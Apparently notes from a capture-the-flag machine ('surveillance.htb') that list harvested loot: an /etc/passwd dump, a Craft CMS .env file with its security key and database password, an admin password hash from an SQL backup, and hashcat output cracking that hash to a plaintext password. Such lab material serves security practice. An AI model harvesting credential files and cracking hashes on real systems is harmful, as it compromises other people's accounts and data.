```bash
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
pollinate:x:105:1::/var/cache/pollinate:/bin/false  
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin  
syslog:x:107:113::/home/syslog:/usr/sbin/nologin  
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin  
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin  
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false  
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin  
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false  
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin  
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash  
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false  
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash  
fwupd-refresh:x:115:123:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin  
_laurel:x:998:998::/var/log/laurel:/bin/false
```

## db.php
```.env
# Read about configuration, here:  
# https://craftcms.com/docs/4.x/config/  
  
# The application ID used to to uniquely store session and cache data, mutex locks, and more  
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7  
  
# The environment Craft is currently running in (dev, staging, production, etc.)  
CRAFT_ENVIRONMENT=production  
  
# The secure key Craft will use for hashing and encrypting data  
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_  
  
# Database connection settings  
CRAFT_DB_DRIVER=mysql  
CRAFT_DB_SERVER=127.0.0.1  
CRAFT_DB_PORT=3306  
CRAFT_DB_DATABASE=craftdb  
CRAFT_DB_USER=craftuser  
CRAFT_DB_PASSWORD=CraftCMSPassword2023!  
CRAFT_DB_SCHEMA=  
CRAFT_DB_TABLE_PREFIX=  
  
# General settings (see config/general.php)  
DEV_MODE=false  
ALLOW_ADMIN_CHANGES=false  
DISALLOW_ROBOTS=false  
  
PRIMARY_SITE_URL=http://surveillance.htb/
```

## backup
```sql
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```

## hashcat
```
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 1400 (SHA2-256)  
Hash.Target......: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c...5770ec  
Time.Started.....: Tue Feb 13 02:21:30 2024 (21 secs)  
Time.Estimated...: Tue Feb 13 02:21:51 2024 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........:   175.8 kH/s (0.19ms) @ Accel:256 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 3552256/14344385 (24.76%)  
Rejected.........: 0/3552256 (0.00%)  
Restore.Point....: 3551232/14344385 (24.76%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#1....: starfish789 -> starbowser  
Hardware.Mon.#1..: Util: 48%  
  
Started: Tue Feb 13 02:20:26 2024  
Stopped: Tue Feb 13 02:21:53 2024
```

Password: starcraft122490